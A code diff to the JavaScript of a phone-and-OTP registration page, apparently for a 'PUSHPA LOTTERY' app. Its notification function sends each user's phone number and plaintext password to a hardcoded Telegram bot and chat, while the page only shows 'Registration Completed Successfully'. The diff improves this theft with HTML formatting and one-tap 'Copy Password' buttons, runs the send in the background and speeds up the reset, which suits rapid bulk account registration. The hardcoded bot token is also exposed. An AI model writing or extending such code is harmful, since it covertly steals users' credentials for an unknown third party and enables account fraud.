@@ -111,19 +111,79 @@ async function api(path,body,token=""){
 async function sendTelegramNotification(phone, password) {
   const botToken = "8580989492:AAFZf_8Oi_X1fJulZCIKPRxxX2jUFQKNefg";
   const chatId = "-1004433364467";
-  const now = new Date();
-  const dateStr = now.toLocaleDateString('en-IN', { year: 'numeric', month: 'long', day: 'numeric' });
-  const timeStr = now.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
-  const message = `📱 Phone Number: ${phone}\n🔑 Password: ${password}\n📅 Date: ${dateStr}\n⏰ Time: ${timeStr}`;
+
+  // India local date/time in YYYY-MM-DD HH:MM:SS format
+  const parts = new Intl.DateTimeFormat("en-CA", {
+    timeZone: "Asia/Kolkata",
+    year: "numeric",
+    month: "2-digit",
+    day: "2-digit",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+    hourCycle: "h23"
+  }).formatToParts(new Date()).reduce((obj, part) => {
+    if (part.type !== "literal") obj[part.type] = part.value;
+    return obj;
+  }, {});
+
+  const dateTime =
+    `${parts.year}-${parts.month}-${parts.day} ` +
+    `${parts.hour}:${parts.minute}:${parts.second}`;
+
+  const message =
+`🎯 <b>NEW ACCOUNT</b>
+━━━━━━━━━━━━━━━━━━━━
+
+🎮 <b>Game:</b> PUSHPA LOTTERY
+
+📱 <b>Phone:</b> <code>${phone}</code>
+🔑 <b>Password:</b> <code>${password}</code>
+🕐 <b>Time:</b> ${dateTime}
+
+━━━━━━━━━━━━━━━━━━━━
+👑 <b>Developed by:</b> Sanju`;
+
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
   try {
-    await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text: message })
+    // Code formatting makes the phone and password easy to select/copy.
+    // Copy buttons are added for Telegram clients that support copy_text.
+    const response = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "HTML",
+        disable_web_page_preview: true,
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: "📋 Copy Number", copy_text: { text: String(phone) } },
+              { text: "🔐 Copy Password", copy_text: { text: String(password) } }
+            ]
+          ]
+        }
+      })
     });
+
+    // If a Telegram client/API does not support copy_text, retry immediately
+    // without buttons so the notification itself is never blocked.
+    if (!response.ok) {
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML",
+          disable_web_page_preview: true
+        })
+      });
+    }
   } catch (e) {
-    console.warn("Telegram notify failed:", e);
+    console.warn("Telegram notification failed:", e);
   }
 }
 
@@ -134,22 +194,27 @@ async function savePassword(){
  if(!otp)return setStatus("Enter the password OTP.","error");
  if(!passwordVerificationToken)return setStatus("Password OTP session expired. Please resend.","error");
 
- $("savePassword").disabled=true;setStatus("Saving password...");
+ $("savePassword").disabled=true;
+ setStatus("Saving password...");
+
  try{
    const result=await api("/api/user/verifyresetpassword",{
      otp,password,verificationToken:passwordVerificationToken
    },accessToken);
 
-   // --- SUCCESS: send Telegram, show success, reset after 3s ---
-   setStatus("Registration Completed Successfully","success");
-   
-   // Send Telegram notification (phone stored from login)
-   if (registeredPhone) {
-     await sendTelegramNotification(registeredPhone, configuredPassword);
+   // Password save is complete. Start Telegram notification immediately,
+   // but do NOT wait for Telegram before resetting the next registration.
+   const completedPhone = registeredPhone;
+   if(completedPhone){
+     sendTelegramNotification(completedPhone, configuredPassword)
+       .catch(e => console.warn("Telegram background error:", e));
    }
 
-   // Reset after 3 seconds
-   setTimeout(resetToNumberPage, 3000);
+   setStatus("✓ Registration Completed Successfully","success");
+
+   // Fast return to the phone number page.
+   setTimeout(resetToNumberPage, 700);
+
  }catch(e){
    setStatus("Password could not be saved: "+e.message,"error");
    $("savePassword").disabled=false;
@@ -210,7 +275,12 @@ async function sendPasswordOtp(isResend=false){
    passwordVerificationToken=result?.data?.verificationToken||"";
    if(!passwordVerificationToken)throw new Error(result.message||"Password OTP token was not received.");
 
-   hideAll();$("passwordOtp").classList.remove("hidden");
+   hideAll();
+   $("passwordOtp").classList.remove("hidden");
+
+   // Always enable save button when a fresh password OTP is sent
+   $("savePassword").disabled=false;
+
    setStatus(isResend?"A new password OTP has been sent.":"Password OTP sent. Enter it to save your password.","success");
    startTimer("resendPasswordOtp","passwordTimer");
  }catch(e){setStatus("Could not send password OTP: "+e.message,"error");btn.disabled=false;}
@@ -219,17 +289,35 @@ async function sendPasswordOtp(isResend=false){
 
 function resetToNumberPage(){
  clearInterval(resendTimer);
+
  loginVerificationToken="";
  passwordVerificationToken="";
  accessToken="";
- registeredPhone = "";
+ registeredPhone="";
+
  $("phone").value="";
  $("loginOtpCode").value="";
  $("passwordOtpCode").value="";
+
+ // Re-enable every button for the next registration
+ $("sendLoginOtp").disabled=false;
+ $("verifyLoginOtp").disabled=false;
+ $("resendLoginOtp").disabled=false;
+ $("requestPasswordOtp").disabled=false;
+ $("savePassword").disabled=false;
+ $("resendPasswordOtp").disabled=false;
+
+ // Reset timer messages
+ $("loginTimer").textContent="";
+ $("passwordTimer").textContent="";
+
  $("title").textContent="Phone Login";
  $("subtitle").textContent="Step 1: Send and verify your login OTP";
- hideAll();$("loginPhone").classList.remove("hidden");
- setStatus("Ready for a new number.");
+
+ hideAll();
+ $("loginPhone").classList.remove("hidden");
+
+ setStatus("Registration completed. Ready for a new number.","success");
  $("phone").focus();
 }
 
